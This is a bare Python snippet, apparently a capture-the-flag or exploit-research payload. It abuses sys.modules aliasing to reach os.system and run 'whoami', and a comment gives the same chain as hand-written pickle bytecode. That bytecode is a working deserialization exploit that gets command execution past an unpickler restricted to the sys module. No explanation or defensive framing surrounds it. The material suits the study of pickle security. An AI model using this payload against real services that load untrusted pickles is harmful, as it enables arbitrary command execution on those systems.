from sys import modules

a = modules
a["sys"] = a

from sys import get

a["sys"] = get("os")

from sys import system
system("whoami")
# b'csys\nmodules\np0\ng0\np1\ng1\n(Vsys\ng1\nucsys\nget\np2\ng1\n(Vsys\ng2\n(Vos\ntRucsys\nsystem\np3\ng3\n(Vwhoami\ntR.'
